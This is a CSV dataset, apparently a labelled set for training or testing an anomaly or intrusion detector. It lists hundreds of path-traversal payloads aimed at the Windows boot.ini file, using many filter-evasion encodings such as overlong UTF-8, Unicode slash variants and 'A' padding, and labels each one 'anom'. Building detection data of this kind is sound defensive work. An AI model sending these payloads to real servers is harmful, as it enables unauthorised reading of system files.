payload,length,attack_type,label
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\boot.ini,283,path-traversal,anom
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\boot.ini,286,path-traversal,anom
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\boot.ini,289,path-traversal,anom
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\..\boot.ini,292,path-traversal,anom
.../boot.ini,12,path-traversal,anom
.../.../boot.ini,16,path-traversal,anom
.../.../.../boot.ini,20,path-traversal,anom
.../.../.../.../boot.ini,24,path-traversal,anom
.../.../.../.../.../boot.ini,28,path-traversal,anom
.../.../.../.../.../.../boot.ini,32,path-traversal,anom
.../.../.../.../.../.../.../boot.ini,36,path-traversal,anom
.../.../.../.../.../.../.../.../boot.ini,40,path-traversal,anom
...\boot.ini,12,path-traversal,anom
...\...\boot.ini,16,path-traversal,anom
...\...\...\boot.ini,20,path-traversal,anom
...\...\...\...\boot.ini,24,path-traversal,anom
...\...\...\...\...\boot.ini,28,path-traversal,anom
...\...\...\...\...\...\boot.ini,32,path-traversal,anom
...\...\...\...\...\...\...\boot.ini,36,path-traversal,anom
...\...\...\...\...\...\...\...\boot.ini,40,path-traversal,anom
..../boot.ini,13,path-traversal,anom
..../..../boot.ini,18,path-traversal,anom
..../..../..../boot.ini,23,path-traversal,anom
..../..../..../..../boot.ini,28,path-traversal,anom
..../..../..../..../..../boot.ini,33,path-traversal,anom
..../..../..../..../..../..../boot.ini,38,path-traversal,anom
..../..../..../..../..../..../..../boot.ini,43,path-traversal,anom
..../..../..../..../..../..../..../..../boot.ini,48,path-traversal,anom
....\boot.ini,13,path-traversal,anom
....\....\boot.ini,18,path-traversal,anom
....\....\....\boot.ini,23,path-traversal,anom
....\....\....\....\boot.ini,28,path-traversal,anom
....\....\....\....\....\boot.ini,33,path-traversal,anom
....\....\....\....\....\....\boot.ini,38,path-traversal,anom
....\....\....\....\....\....\....\boot.ini,43,path-traversal,anom
....\....\....\....\....\....\....\....\boot.ini,48,path-traversal,anom
........................................................................../boot.ini,83,path-traversal,anom
........................................................................../../boot.ini,86,path-traversal,anom
........................................................................../../../boot.ini,89,path-traversal,anom
........................................................................../../../../boot.ini,92,path-traversal,anom
........................................................................../../../../../boot.ini,95,path-traversal,anom
........................................................................../../../../../../boot.ini,98,path-traversal,anom
........................................................................../../../../../../../boot.ini,101,path-traversal,anom
........................................................................../../../../../../../../boot.ini,104,path-traversal,anom
..........................................................................\boot.ini,83,path-traversal,anom
..........................................................................\..\boot.ini,86,path-traversal,anom
..........................................................................\..\..\boot.ini,89,path-traversal,anom
..........................................................................\..\..\..\boot.ini,92,path-traversal,anom
..........................................................................\..\..\..\..\boot.ini,95,path-traversal,anom
..........................................................................\..\..\..\..\..\boot.ini,98,path-traversal,anom
..........................................................................\..\..\..\..\..\..\boot.ini,101,path-traversal,anom
..........................................................................\..\..\..\..\..\..\..\boot.ini,104,path-traversal,anom
..%u2215boot.ini,16,path-traversal,anom
..%u2215..%u2215boot.ini,24,path-traversal,anom
..%u2215..%u2215..%u2215boot.ini,32,path-traversal,anom
..%u2215..%u2215..%u2215..%u2215boot.ini,40,path-traversal,anom
..%u2215..%u2215..%u2215..%u2215..%u2215boot.ini,48,path-traversal,anom
..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215boot.ini,56,path-traversal,anom
..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215boot.ini,64,path-traversal,anom
..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215boot.ini,72,path-traversal,anom
%uff0e%uff0e/boot.ini,21,path-traversal,anom
%uff0e%uff0e/%uff0e%uff0e/boot.ini,34,path-traversal,anom
%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini,47,path-traversal,anom
%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini,60,path-traversal,anom
%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini,73,path-traversal,anom
%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini,86,path-traversal,anom
%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini,99,path-traversal,anom
%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini,112,path-traversal,anom
%uff0e%uff0e%u2215boot.ini,26,path-traversal,anom
%uff0e%uff0e%u2215%uff0e%uff0e%u2215boot.ini,44,path-traversal,anom
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215boot.ini,62,path-traversal,anom
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215boot.ini,80,path-traversal,anom
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215boot.ini,98,path-traversal,anom
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215boot.ini,116,path-traversal,anom
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215boot.ini,134,path-traversal,anom
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215boot.ini,152,path-traversal,anom
..%u2216boot.ini,16,path-traversal,anom
..%u2216..%u2216boot.ini,24,path-traversal,anom
..%u2216..%u2216..%u2216boot.ini,32,path-traversal,anom
..%u2216..%u2216..%u2216..%u2216boot.ini,40,path-traversal,anom
..%u2216..%u2216..%u2216..%u2216..%u2216boot.ini,48,path-traversal,anom
..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216boot.ini,56,path-traversal,anom
..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216boot.ini,64,path-traversal,anom
..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216boot.ini,72,path-traversal,anom
..%uEFC8boot.ini,16,path-traversal,anom
..%uEFC8..%uEFC8boot.ini,24,path-traversal,anom
..%uEFC8..%uEFC8..%uEFC8boot.ini,32,path-traversal,anom
..%uEFC8..%uEFC8..%uEFC8..%uEFC8boot.ini,40,path-traversal,anom
..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8boot.ini,48,path-traversal,anom
..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8boot.ini,56,path-traversal,anom
..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8boot.ini,64,path-traversal,anom
..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8boot.ini,72,path-traversal,anom
..%uF025boot.ini,16,path-traversal,anom
..%uF025..%uF025boot.ini,24,path-traversal,anom
..%uF025..%uF025..%uF025boot.ini,32,path-traversal,anom
..%uF025..%uF025..%uF025..%uF025boot.ini,40,path-traversal,anom
..%uF025..%uF025..%uF025..%uF025..%uF025boot.ini,48,path-traversal,anom
..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025boot.ini,56,path-traversal,anom
..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025boot.ini,64,path-traversal,anom
..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025boot.ini,72,path-traversal,anom
%uff0e%uff0e\boot.ini,21,path-traversal,anom
%uff0e%uff0e\%uff0e%uff0e\boot.ini,34,path-traversal,anom
%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\boot.ini,47,path-traversal,anom
%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\boot.ini,60,path-traversal,anom
%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\boot.ini,73,path-traversal,anom
%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\boot.ini,86,path-traversal,anom
%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\boot.ini,99,path-traversal,anom
%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\boot.ini,112,path-traversal,anom
%uff0e%uff0e%u2216boot.ini,26,path-traversal,anom
%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini,44,path-traversal,anom
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini,62,path-traversal,anom
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini,80,path-traversal,anom
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini,98,path-traversal,anom
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini,116,path-traversal,anom
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini,134,path-traversal,anom
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini,152,path-traversal,anom
..0x2fboot.ini,14,path-traversal,anom
..0x2f..0x2fboot.ini,20,path-traversal,anom
..0x2f..0x2f..0x2fboot.ini,26,path-traversal,anom
..0x2f..0x2f..0x2f..0x2fboot.ini,32,path-traversal,anom
..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini,38,path-traversal,anom
..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini,44,path-traversal,anom
..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini,50,path-traversal,anom
..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini,56,path-traversal,anom
0x2e0x2e/boot.ini,17,path-traversal,anom
0x2e0x2e/0x2e0x2e/boot.ini,26,path-traversal,anom
0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini,35,path-traversal,anom
0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini,44,path-traversal,anom
0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini,53,path-traversal,anom
0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini,62,path-traversal,anom
0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini,71,path-traversal,anom
0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini,80,path-traversal,anom
0x2e0x2e0x2fboot.ini,20,path-traversal,anom
0x2e0x2e0x2f0x2e0x2e0x2fboot.ini,32,path-traversal,anom
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini,44,path-traversal,anom
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini,56,path-traversal,anom
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini,68,path-traversal,anom
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini,80,path-traversal,anom
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini,92,path-traversal,anom
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini,104,path-traversal,anom
..0x5cboot.ini,14,path-traversal,anom
..0x5c..0x5cboot.ini,20,path-traversal,anom
..0x5c..0x5c..0x5cboot.ini,26,path-traversal,anom
..0x5c..0x5c..0x5c..0x5cboot.ini,32,path-traversal,anom
..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini,38,path-traversal,anom
..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini,44,path-traversal,anom
..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini,50,path-traversal,anom
..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini,56,path-traversal,anom
0x2e0x2e\boot.ini,17,path-traversal,anom
0x2e0x2e\0x2e0x2e\boot.ini,26,path-traversal,anom
0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini,35,path-traversal,anom
0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini,44,path-traversal,anom
0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini,53,path-traversal,anom
0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini,62,path-traversal,anom
0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini,71,path-traversal,anom
0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini,80,path-traversal,anom
0x2e0x2e0x5cboot.ini,20,path-traversal,anom
0x2e0x2e0x5c0x2e0x2e0x5cboot.ini,32,path-traversal,anom
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini,44,path-traversal,anom
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini,56,path-traversal,anom
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini,68,path-traversal,anom
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini,80,path-traversal,anom
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini,92,path-traversal,anom
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini,104,path-traversal,anom
..%c0%2fboot.ini,16,path-traversal,anom
..%c0%2f..%c0%2fboot.ini,24,path-traversal,anom
..%c0%2f..%c0%2f..%c0%2fboot.ini,32,path-traversal,anom
..%c0%2f..%c0%2f..%c0%2f..%c0%2fboot.ini,40,path-traversal,anom
..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fboot.ini,48,path-traversal,anom
..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fboot.ini,56,path-traversal,anom
..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fboot.ini,64,path-traversal,anom
..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fboot.ini,72,path-traversal,anom
%c0%2e%c0%2e/boot.ini,21,path-traversal,anom
%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini,34,path-traversal,anom
%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini,47,path-traversal,anom
%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini,60,path-traversal,anom
%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini,73,path-traversal,anom
%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini,86,path-traversal,anom
%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini,99,path-traversal,anom
%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini,112,path-traversal,anom
%c0%2e%c0%2e%c0%2fboot.ini,26,path-traversal,anom
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini,44,path-traversal,anom
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini,62,path-traversal,anom
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini,80,path-traversal,anom
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini,98,path-traversal,anom
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini,116,path-traversal,anom
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini,134,path-traversal,anom
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini,152,path-traversal,anom
..%c0%5cboot.ini,16,path-traversal,anom
..%c0%5c..%c0%5cboot.ini,24,path-traversal,anom
..%c0%5c..%c0%5c..%c0%5cboot.ini,32,path-traversal,anom
..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini,40,path-traversal,anom
..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini,48,path-traversal,anom
..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini,56,path-traversal,anom
..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini,64,path-traversal,anom
..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini,72,path-traversal,anom
%c0%2e%c0%2e\boot.ini,21,path-traversal,anom
%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini,34,path-traversal,anom
%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini,47,path-traversal,anom
%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini,60,path-traversal,anom
%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini,73,path-traversal,anom
%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini,86,path-traversal,anom
%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini,99,path-traversal,anom
%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini,112,path-traversal,anom
%c0%2e%c0%2e%c0%5cboot.ini,26,path-traversal,anom
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini,44,path-traversal,anom
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini,62,path-traversal,anom
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini,80,path-traversal,anom
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini,98,path-traversal,anom
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini,116,path-traversal,anom
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini,134,path-traversal,anom
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini,152,path-traversal,anom
///%2e%2e%2fboot.ini,20,path-traversal,anom
///%2e%2e%2f%2e%2e%2fboot.ini,29,path-traversal,anom
///%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini,38,path-traversal,anom
///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini,47,path-traversal,anom
///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini,56,path-traversal,anom
///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini,65,path-traversal,anom
///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini,74,path-traversal,anom
///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini,83,path-traversal,anom
\\\%2e%2e%5cboot.ini,20,path-traversal,anom
\\\%2e%2e%5c%2e%2e%5cboot.ini,29,path-traversal,anom
\\\%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,38,path-traversal,anom
\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,47,path-traversal,anom
\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,56,path-traversal,anom
\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,65,path-traversal,anom
\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,74,path-traversal,anom
\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,83,path-traversal,anom
..//boot.ini,12,path-traversal,anom
..//..//boot.ini,16,path-traversal,anom
..//..//..//boot.ini,20,path-traversal,anom
..//..//..//..//boot.ini,24,path-traversal,anom
..//..//..//..//..//boot.ini,28,path-traversal,anom
..//..//..//..//..//..//boot.ini,32,path-traversal,anom
..//..//..//..//..//..//..//boot.ini,36,path-traversal,anom
..//..//..//..//..//..//..//..//boot.ini,40,path-traversal,anom
..///boot.ini,13,path-traversal,anom
..///..///boot.ini,18,path-traversal,anom
..///..///..///boot.ini,23,path-traversal,anom
..///..///..///..///boot.ini,28,path-traversal,anom
..///..///..///..///..///boot.ini,33,path-traversal,anom
..///..///..///..///..///..///boot.ini,38,path-traversal,anom
..///..///..///..///..///..///..///boot.ini,43,path-traversal,anom
..///..///..///..///..///..///..///..///boot.ini,48,path-traversal,anom
..\\boot.ini,12,path-traversal,anom
..\\..\\boot.ini,16,path-traversal,anom
..\\..\\..\\boot.ini,20,path-traversal,anom
..\\..\\..\\..\\boot.ini,24,path-traversal,anom
..\\..\\..\\..\\..\\boot.ini,28,path-traversal,anom
..\\..\\..\\..\\..\\..\\boot.ini,32,path-traversal,anom
..\\..\\..\\..\\..\\..\\..\\boot.ini,36,path-traversal,anom
..\\..\\..\\..\\..\\..\\..\\..\\boot.ini,40,path-traversal,anom
